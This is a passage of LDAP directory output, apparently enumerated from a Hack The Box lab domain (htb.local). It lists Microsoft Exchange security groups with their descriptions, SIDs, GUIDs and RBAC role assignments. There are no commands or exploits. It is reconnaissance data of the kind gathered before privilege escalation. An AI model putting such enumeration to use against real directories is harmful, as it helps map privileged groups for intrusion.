msExchUserBL: CN=E-Mail Address Policies-Organization Management,CN=Role Assig
 nments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Con
 figuration,DC=htb,DC=local
msExchUserBL: CN=E-Mail Address Policies-Organization Management-Delegating,CN
 =Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Serv
 ices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Edge Subscriptions-Organization Management,CN=Role Assignment
 s,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configur
 ation,DC=htb,DC=local
msExchUserBL: CN=Edge Subscriptions-Organization Management-Delegating,CN=Role
  Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,
 CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Distribution Groups-Organization Management,CN=Role Assignmen
 ts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configu
 ration,DC=htb,DC=local
msExchUserBL: CN=Distribution Groups-Organization Management-Delegating,CN=Rol
 e Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services
 ,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Disaster Recovery-Organization Management,CN=Role Assignments
 ,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configura
 tion,DC=htb,DC=local
msExchUserBL: CN=Disaster Recovery-Organization Management-Delegating,CN=Role 
 Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,C
 N=Configuration,DC=htb,DC=local
msExchUserBL: CN=Databases-Organization Management,CN=Role Assignments,CN=RBAC
 ,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=
 htb,DC=local
msExchUserBL: CN=Databases-Organization Management-Delegating,CN=Role Assignme
 nts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Config
 uration,DC=htb,DC=local
msExchUserBL: CN=Database Copies-Organization Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=Database Copies-Organization Management-Delegating,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=Database Availability Groups-Organization Management,CN=Role 
 Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,C
 N=Configuration,DC=htb,DC=local
msExchUserBL: CN=Database Availability Groups-Organization Management-Delegati
 ng,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN
 =Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Data Loss Prevention-Organization Management,CN=Role Assignme
 nts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Config
 uration,DC=htb,DC=local
msExchUserBL: CN=Data Loss Prevention-Organization Management-Delegating,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Compliance Admin-Organization Management,CN=Role Assignments,
 CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurat
 ion,DC=htb,DC=local
msExchUserBL: CN=Compliance Admin-Organization Management-Delegating,CN=Role A
 ssignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
msExchUserBL: CN=Cmdlet Extension Agents-Organization Management,CN=Role Assig
 nments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Con
 figuration,DC=htb,DC=local
msExchUserBL: CN=Cmdlet Extension Agents-Organization Management-Delegating,CN
 =Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Serv
 ices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Audit Logs-Organization Management,CN=Role Assignments,CN=RBA
 C,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC
 =htb,DC=local
msExchUserBL: CN=Audit Logs-Organization Management-Delegating,CN=Role Assignm
 ents,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Confi
 guration,DC=htb,DC=local
msExchUserBL: CN=ArchiveApplication-Organization Management-Delegating,CN=Role
  Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,
 CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=ApplicationImpersonation-Organization Management-Delegating,C
 N=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Ser
 vices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Address Lists-Organization Management,CN=Role Assignments,CN=
 RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration
 ,DC=htb,DC=local
msExchUserBL: CN=Address Lists-Organization Management-Delegating,CN=Role Assi
 gnments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Co
 nfiguration,DC=htb,DC=local
msExchUserBL: CN=Active Directory Permissions-Organization Management,CN=Role 
 Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,C
 N=Configuration,DC=htb,DC=local
msExchUserBL: CN=Active Directory Permissions-Organization Management-Delegati
 ng,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN
 =Services,CN=Configuration,DC=htb,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 1
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Recipient Management, Microsoft Exchange Security Groups, htb.local
dn: CN=Recipient Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=lo
 cal
objectClass: top
objectClass: group
cn: Recipient Management
description: Members of this management role group have rights to create, mana
 ge, and remove Exchange recipient objects in the Exchange organization.
distinguishedName: CN=Recipient Management,OU=Microsoft Exchange Security Grou
 ps,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21509
uSNChanged: 21579
garbageCollPeriod: 1209600
name: Recipient Management
objectGUID:: +bElzOS4ykOgO4LwAZrBow==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPUQQAAA==
sAMAccountName: Recipient Management
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=Team Mailboxes-Recipient Management,CN=Role Assignments,CN=RB
 AC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchUserBL: CN=Recipient Policies-Recipient Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=Move Mailboxes-Recipient Management,CN=Role Assignments,CN=RB
 AC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchUserBL: CN=Migration-Recipient Management,CN=Role Assignments,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchUserBL: CN=Message Tracking-Recipient Management,CN=Role Assignments,CN=
 RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration
 ,DC=htb,DC=local
msExchUserBL: CN=Mail Recipients-Recipient Management,CN=Role Assignments,CN=R
 BAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,
 DC=htb,DC=local
msExchUserBL: CN=Mail Recipient Creation-Recipient Management,CN=Role Assignme
 nts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Config
 uration,DC=htb,DC=local
msExchUserBL: CN=Distribution Groups-Recipient Management,CN=Role Assignments,
 CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurat
 ion,DC=htb,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 2
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# View-Only Organization Management, Microsoft Exchange Security Groups, htb.lo
 cal
dn: CN=View-Only Organization Management,OU=Microsoft Exchange Security Groups
 ,DC=htb,DC=local
objectClass: top
objectClass: group
cn: View-Only Organization Management
description: Members of this management role group can view recipient and conf
 iguration objects and their properties in the Exchange organization.
distinguishedName: CN=View-Only Organization Management,OU=Microsoft Exchange 
 Security Groups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21514
uSNChanged: 21581
garbageCollPeriod: 1209600
name: View-Only Organization Management
objectGUID:: 2a4oOmy+0Uyl+uq4DexSJg==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPUgQAAA==
sAMAccountName: View-Only Organization Management
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=View-Only Recipients-View-Only Organization Management,CN=Rol
 e Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services
 ,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=View-Only Configuration-View-Only Organization Management,CN=
 Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Servi
 ces,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Monitoring-View-Only Organization Management,CN=Role Assignme
 nts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Config
 uration,DC=htb,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 3
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Public Folder Management, Microsoft Exchange Security Groups, htb.local
dn: CN=Public Folder Management,OU=Microsoft Exchange Security Groups,DC=htb,D
 C=local
objectClass: top
objectClass: group
cn: Public Folder Management
description: Members of this management role group can manage public folders. 
 Members can create and delete public folders and manage public folder setting
 s such as replicas, quotas, age limits, and permissions as well as mail-enabl
 e and mail-disable public folders.
distinguishedName: CN=Public Folder Management,OU=Microsoft Exchange Security 
 Groups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21519
uSNChanged: 21638
garbageCollPeriod: 1209600
name: Public Folder Management
objectGUID:: gY0E0gmnyUC6IDV1krguqw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPUwQAAA==
sAMAccountName: Public Folder Management
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=Public Folders-Public Folder Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=Mail Enabled Public Folders-Public Folder Management,CN=Role 
 Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,C
 N=Configuration,DC=htb,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 4
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# UM Management, Microsoft Exchange Security Groups, htb.local
dn: CN=UM Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
objectClass: top
objectClass: group
cn: UM Management
description: Members of this management role group can manage Unified Messagin
 g organization, server, and recipient configuration.
distinguishedName: CN=UM Management,OU=Microsoft Exchange Security Groups,DC=h
 tb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21524
uSNChanged: 21585
garbageCollPeriod: 1209600
name: UM Management
objectGUID:: ElcouwBxFUmEBCq6tCbyKw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPVAQAAA==
sAMAccountName: UM Management
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=Unified Messaging-UM Management,CN=Role Assignments,CN=RBAC,C
 N=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=ht
 b,DC=local
msExchUserBL: CN=UM Prompts-UM Management,CN=Role Assignments,CN=RBAC,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchUserBL: CN=UM Mailboxes-UM Management,CN=Role Assignments,CN=RBAC,CN=Fir
 st Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=
 local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 5
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Help Desk, Microsoft Exchange Security Groups, htb.local
dn: CN=Help Desk,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Help Desk
description: Members of this management role group can view and manage the con
 figuration for individual recipients and view recipients in an Exchange organ
 ization. Members of this role group can only manage the configuration each us
 er can manage on his or her own mailbox. Additional  permissions can be added
  by assigning additional management roles to this role group.
distinguishedName: CN=Help Desk,OU=Microsoft Exchange Security Groups,DC=htb,D
 C=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21529
uSNChanged: 21587
garbageCollPeriod: 1209600
name: Help Desk
objectGUID:: bozhXqlZjU+ETygi+ag2lQ==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPVQQAAA==
sAMAccountName: Help Desk
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=View-Only Recipients-Help Desk,CN=Role Assignments,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchUserBL: CN=User Options-Help Desk,CN=Role Assignments,CN=RBAC,CN=First O
 rganization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=loca
 l
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 6
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Records Management, Microsoft Exchange Security Groups, htb.local
dn: CN=Records Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=loca
 l
objectClass: top
objectClass: group
cn: Records Management
description: Members of this management role group can configure compliance fe
 atures such as retention policy tags, message classifications, transport rule
 s, and more.
distinguishedName: CN=Records Management,OU=Microsoft Exchange Security Groups
 ,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21534
uSNChanged: 21589
garbageCollPeriod: 1209600
name: Records Management
objectGUID:: RbxnNH0/J0un7M0REktqTA==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPVgQAAA==
sAMAccountName: Records Management
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=Transport Rules-Records Management,CN=Role Assignments,CN=RBA
 C,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC
 =htb,DC=local
msExchUserBL: CN=Retention Management-Records Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=Message Tracking-Records Management,CN=Role Assignments,CN=RB
 AC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchUserBL: CN=Journaling-Records Management,CN=Role Assignments,CN=RBAC,CN=
 First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,
 DC=local
msExchUserBL: CN=Audit Logs-Records Management,CN=Role Assignments,CN=RBAC,CN=
 First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,
 DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 7
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Discovery Management, Microsoft Exchange Security Groups, htb.local
dn: CN=Discovery Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=lo
 cal
objectClass: top
objectClass: group
cn: Discovery Management
description: Members of this management role group can perform searches of mai
 lboxes in the Exchange organization for data that meets specific criteria.
distinguishedName: CN=Discovery Management,OU=Microsoft Exchange Security Grou
 ps,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21539
uSNChanged: 21591
garbageCollPeriod: 1209600
name: Discovery Management
objectGUID:: u9r+gS+RS0O0M7xYJyhtHw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPVwQAAA==
sAMAccountName: Discovery Management
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=Mailbox Search-Discovery Management,CN=Role Assignments,CN=RB
 AC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchUserBL: CN=Legal Hold-Discovery Management,CN=Role Assignments,CN=RBAC,C
 N=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=ht
 b,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 8
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Server Management, Microsoft Exchange Security Groups, htb.local
dn: CN=Server Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Server Management
description: Members of this management role group have permissions to manage 
 all Exchange servers within the Exchange organization, but members don't have
  permissions to perform operations that have global impact in the Exchange or
 ganization.
distinguishedName: CN=Server Management,OU=Microsoft Exchange Security Groups,
 DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21544
uSNChanged: 21593
garbageCollPeriod: 1209600
name: Server Management
objectGUID:: d0/k0AidgE253Wxe+C8n1A==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPWAQAAA==
sAMAccountName: Server Management
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=Transport Queues-Server Management,CN=Role Assignments,CN=RBA
 C,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC
 =htb,DC=local
msExchUserBL: CN=Receive Connectors-Server Management,CN=Role Assignments,CN=R
 BAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,
 DC=htb,DC=local
msExchUserBL: CN=POP3 And IMAP4 Protocols-Server Management,CN=Role Assignment
 s,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configur
 ation,DC=htb,DC=local
msExchUserBL: CN=Monitoring-Server Management,CN=Role Assignments,CN=RBAC,CN=F
 irst Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,D
 C=local
msExchUserBL: CN=Exchange Virtual Directories-Server Management,CN=Role Assign
 ments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Conf
 iguration,DC=htb,DC=local
msExchUserBL: CN=Exchange Servers-Server Management,CN=Role Assignments,CN=RBA
 C,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC
 =htb,DC=local
msExchUserBL: CN=Exchange Server Certificates-Server Management,CN=Role Assign
 ments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Conf
 iguration,DC=htb,DC=local
msExchUserBL: CN=Exchange Connectors-Server Management,CN=Role Assignments,CN=
 RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration
 ,DC=htb,DC=local
msExchUserBL: CN=Databases-Server Management,CN=Role Assignments,CN=RBAC,CN=Fi
 rst Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC
 =local
msExchUserBL: CN=Database Copies-Server Management,CN=Role Assignments,CN=RBAC
 ,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=
 htb,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 9
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Delegated Setup, Microsoft Exchange Security Groups, htb.local
dn: CN=Delegated Setup,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Delegated Setup
description: Members of this management role group have permissions to install
  and uninstall Exchange on provisioned servers. This role group shouldn't be 
 deleted.
distinguishedName: CN=Delegated Setup,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21549
uSNChanged: 21595
garbageCollPeriod: 1209600
name: Delegated Setup
objectGUID:: +qNgtMJl90Gn3ptcrYeF1Q==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPWQQAAA==
sAMAccountName: Delegated Setup
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=View-Only Configuration-Delegated Setup,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 10
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Hygiene Management, Microsoft Exchange Security Groups, htb.local
dn: CN=Hygiene Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=loca
 l
objectClass: top
objectClass: group
cn: Hygiene Management
description: Members of this management role group can manage Exchange anti-sp
 am features and grant permissions for antivirus products to integrate with Ex
